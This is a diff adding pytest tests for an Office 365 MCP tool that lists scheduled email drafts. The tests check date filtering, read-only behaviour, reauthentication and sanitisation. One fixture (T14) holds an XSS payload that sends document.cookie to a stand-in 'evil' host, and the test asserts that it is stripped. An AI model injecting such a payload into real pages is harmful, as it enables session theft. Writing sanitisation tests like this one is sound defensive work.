@@ -12,6 +12,7 @@ from datetime import timedelta
 from mcp_o365.auth.plane_b import PlaneB
 from mcp_o365.tools.email import (
     run_email_list_attachments,
+    run_email_list_scheduled,
     run_email_read,
     run_email_search,
 )
@@ -220,3 +221,122 @@ async def test_periodo_curto_pagina_tudo_sem_perguntar(mapping, store, config, c
     assert out["count"] == 2
     assert out["auto_fetched_all"] is True
     assert gc.count("list_messages_next") == 1
+
+
+# ==================== US-1.10 — LISTAR AGENDADOS (T12-T17) ====================
+#
+# O relógio dos testes está fixo em 2026-06-01T12:00:00Z (FIXED_NOW). "Futuro" e
+# "passado" são relativos a esse instante.
+
+
+async def test_list_scheduled_filtra_futuro_client_side_T12(mapping, store, config, clock):
+    """T12 (AC2/AC3) — 2 drafts (1 futuro, 1 passado): só o futuro vem; item completo;
+    content_is_untrusted=true; list_deferred_drafts chamado 1x."""
+    _link(mapping, clock)
+    gc = FakeGraphClient(
+        mailbox_timezone="Europe/Lisbon",
+        deferred_drafts={
+            "drafts": [
+                {"id": "d-fut", "subject": "Futuro",
+                 "to": ["a@mobiweb.pt", "b@empresa.com"],
+                 "deferred_send_at": "2026-06-10T09:00:00Z"},
+                {"id": "d-pas", "subject": "Passado",
+                 "to": ["c@mobiweb.pt"],
+                 "deferred_send_at": "2026-05-01T09:00:00Z"},
+            ],
+            "next": None,
+        },
+    )
+    out = await run_email_list_scheduled(
+        "subj-1", mapping=mapping, plane_b=_plane_b(config, clock),
+        graph_client=gc, store=store, clock=clock,
+    )
+    assert out["status"] == "ok"
+    assert out["count"] == 1
+    assert out["content_is_untrusted"] is True
+    assert out["has_more"] is False
+    item = out["scheduled"][0]
+    assert item["id"] == "d-fut"
+    assert item["subject"] == "Futuro"
+    assert item["recipients_count"] == 2
+    assert sorted(item["recipient_domains"]) == ["empresa.com", "mobiweb.pt"]
+    assert item["send_at_utc"] == "2026-06-10T09:00:00Z"
+    assert "send_at" in item  # apresentação no fuso
+    assert gc.count("list_deferred_drafts") == 1
+
+
+async def test_list_scheduled_query_usa_prop_id_T13(mapping, store, config, clock):
+    """T13 (AC2) — list_deferred_drafts é chamado com prop_id='SystemTime 0x3FEF'."""
+    _link(mapping, clock)
+    gc = FakeGraphClient(deferred_drafts={"drafts": [], "next": None})
+    await run_email_list_scheduled(
+        "subj-1", mapping=mapping, plane_b=_plane_b(config, clock),
+        graph_client=gc, store=store, top=10, clock=clock,
+    )
+    call = next(c for c in gc.calls if c[0] == "list_deferred_drafts")
+    assert call[2]["prop_id"] == "SystemTime 0x3FEF"
+    assert call[2]["top"] == 10
+
+
+async def test_list_scheduled_sanitiza_assunto_T14(mapping, store, config, clock):
+    """T14 (AC5) — assunto com HTML/<script> é sanitizado na resposta."""
+    _link(mapping, clock)
+    gc = FakeGraphClient(deferred_drafts={
+        "drafts": [{
+            "id": "d1",
+            "subject": "Olá<script>fetch('https://evil/'+document.cookie)</script>",
+            "to": ["a@mobiweb.pt"],
+            "deferred_send_at": "2026-06-10T09:00:00Z",
+        }],
+        "next": None,
+    })
+    out = await run_email_list_scheduled(
+        "subj-1", mapping=mapping, plane_b=_plane_b(config, clock),
+        graph_client=gc, store=store, clock=clock,
+    )
+    subj = out["scheduled"][0]["subject"]
+    assert "<script" not in subj
+    assert "fetch(" not in subj
+    assert "Olá" in subj
+
+
+async def test_list_scheduled_leitura_nao_escreve_T15(mapping, store, config, clock):
+    """T15 (AC1) — listar não faz escritas (create_draft/move_message/send_draft a 0)."""
+    _link(mapping, clock)
+    gc = FakeGraphClient(deferred_drafts={
+        "drafts": [{"id": "d1", "subject": "X", "to": ["a@mobiweb.pt"],
+                    "deferred_send_at": "2026-06-10T09:00:00Z"}],
+        "next": None,
+    })
+    await run_email_list_scheduled(
+        "subj-1", mapping=mapping, plane_b=_plane_b(config, clock),
+        graph_client=gc, store=store, clock=clock,
+    )
+    assert gc.count("create_draft") == 0
+    assert gc.count("move_message") == 0
+    assert gc.count("send_draft") == 0
+    assert gc.count("send_mail") == 0
+
+
+async def test_list_scheduled_reauth_T16(mapping, store, config, clock):
+    """T16 (AC6) — 401 persistente em list_deferred_drafts -> reauth_required."""
+    _link(mapping, clock)
+    gc = FakeGraphClient(auth_fail={"list_deferred_drafts": 5})
+    out = await run_email_list_scheduled(
+        "subj-1", mapping=mapping, plane_b=_plane_b(config, clock),
+        graph_client=gc, store=store, clock=clock,
+    )
+    assert out["status"] == "reauth_required"
+
+
+async def test_list_scheduled_vazio_T17(mapping, store, config, clock):
+    """T17 — sem rascunhos diferidos -> ok, count=0, scheduled=[]."""
+    _link(mapping, clock)
+    gc = FakeGraphClient(deferred_drafts={"drafts": [], "next": None})
+    out = await run_email_list_scheduled(
+        "subj-1", mapping=mapping, plane_b=_plane_b(config, clock),
+        graph_client=gc, store=store, clock=clock,
+    )
+    assert out["status"] == "ok"
+    assert out["count"] == 0
+    assert out["scheduled"] == []
